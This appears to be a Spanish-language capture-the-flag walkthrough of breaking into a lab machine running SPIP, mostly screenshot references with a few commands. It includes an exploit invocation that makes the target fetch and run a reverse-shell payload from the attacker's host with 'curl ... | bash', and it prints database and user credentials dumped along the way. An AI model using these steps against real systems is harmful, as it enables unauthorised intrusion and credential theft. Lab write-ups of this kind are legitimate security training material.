Hacemos el escaneo con nmap:
![[Pasted image 20231026082921.png]]
Esto es lo que corre por el puerto 80:
![[Pasted image 20231026083005.png]]
Vemos en searchsploit si existen exploits con SPIP:
![[Pasted image 20231026083058.png]]
O también por exploitdb y nos bajamos este mismo:
![[Pasted image 20231026083205.png]]
Por tanto lo que haremos será primero crear un servidor http con python con el payload de la reverse shell:
![[Pasted image 20231026083743.png]]
Lanzamos el exploit:
```python
python3 51536.py -u http://192.168.0.34/ -c "curl 192.168.0.32 | bash" -v
```
![[Pasted image 20231026083755.png]]
Y recibimos la conexión con netcat:
![[Pasted image 20231026083815.png]]
Y el contenido del fichero .bash_history nos da una pista de que igual podemos entrar a la base de datos, aunque aún nos falta la contraseña:
![[Pasted image 20231026084605.png]]
Y dentro del directorio config nos encontramos con un archivo llamado connect.php con la contraseña de root de la base de datos:
```sql
root:dbpassword
```
![[Pasted image 20231026084721.png]]
![[Pasted image 20231026084836.png]]
Usamos la base de datos spip y vemos una tabla llamada spip_auteurs:
![[Pasted image 20231026085019.png]]
Seleccionamos todo el contenido de la tabla spip_auteurs y vemos las credenciales del usuario angela:
![[Pasted image 20231026085114.png]]
```bash
angela:4ng3l4
```
Nos autenticamos y ya somos el usuario angela:
![[Pasted image 20231026090025.png]]
Y vemos que estamos ante esta versión de ubuntu:
![[Pasted image 20231026090059.png]]
Y si miramos en google tenemos este exploit:
![[Pasted image 20231026090640.png]]
Y buscamos por ese cve llegando a este repositorio de github:
![[Pasted image 20231026091110.png]]
Nos lo bajamos en la máquina víctima:
![[Pasted image 20231026091202.png]]
Ejecutamos un try y comienza una especie de contador:
![[Pasted image 20231026091355.png]]
